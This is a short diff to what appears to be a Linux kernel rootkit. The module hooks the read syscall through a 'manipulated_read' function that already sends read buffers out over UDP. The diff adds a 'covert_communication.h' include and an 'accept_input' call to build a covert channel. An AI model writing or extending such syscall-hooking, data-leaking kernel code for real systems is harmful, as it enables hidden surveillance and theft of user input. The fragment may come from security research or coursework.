@@ -8,6 +8,7 @@
 #include <linux/netpoll.h>
 #include <linux/init.h>
 
+#include "covert_communication.h"
 #include "include.h"
 
 asmlinkage long (*original_read) (unsigned int fd, char __user *buf, size_t count);
@@ -71,6 +72,7 @@ asmlinkage long manipulated_read (unsigned int fd, char __user *buf, size_t coun
 		send_udp(buf);
 
 		// TODO: implement covert communication channel
+		accept_input(buf[0]);
 	}
 
 	/* nothing else below this line */
